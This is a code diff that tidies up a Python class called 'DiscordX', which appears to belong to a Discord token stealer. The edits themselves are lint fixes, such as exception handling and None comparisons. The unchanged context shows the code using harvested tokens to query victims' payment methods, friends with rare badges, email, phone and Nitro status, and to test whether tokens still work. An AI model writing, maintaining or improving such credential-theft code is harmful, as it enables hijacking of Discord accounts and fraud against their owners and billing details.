@@ -1,5 +1,4 @@
 from json import loads, dumps
-import requests
 from urllib.request import Request, urlopen
 
 from configuration import Config 
@@ -82,7 +81,7 @@ class DiscordX(): #Updating soon
                         "https://discord.com/api/v6/users/@me/relationships",
                         headers=headers,
                     )).read().decode())
-        except:
+        except Exception:
             return False
 
         uhqlist = ""
@@ -91,7 +90,7 @@ class DiscordX(): #Updating soon
             flags = friend["user"]["public_flags"]
             for badge in badgeList:
                 if flags // badge["Value"] != 0 and friend["type"] == 1:
-                    if not "House" in badge["Name"]:
+                    if "House" not in badge["Name"]:
                         OwnedBadges += badge["Emoji"]
                     flags = flags % badge["Value"]
             if OwnedBadges != "":
@@ -115,7 +114,7 @@ class DiscordX(): #Updating soon
                         "https://discord.com/api/users/@me/billing/payment-sources",
                         headers=headers,
                     )).read().decode())
-        except:
+        except Exception:
             return False
 
         if billingjson == []:
@@ -123,7 +122,7 @@ class DiscordX(): #Updating soon
 
         billing = ""
         for methode in billingjson:
-            if methode["invalid"] == False:
+            if methode["invalid"] is False:
                 if methode["type"] == 1:
                     billing += ":credit_card:"
                 elif methode["type"] == 2:
@@ -246,7 +245,7 @@ class DiscordX(): #Updating soon
                 Request("https://discordapp.com/api/v6/users/@me",
                         headers=headers))
             return True
-        except:
+        except Exception:
             return False
 
 
@@ -260,7 +259,7 @@ class DiscordX(): #Updating soon
         }
         username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)
 
-        if pfp == None:
+        if pfp is None:
             pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
         else:
             pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
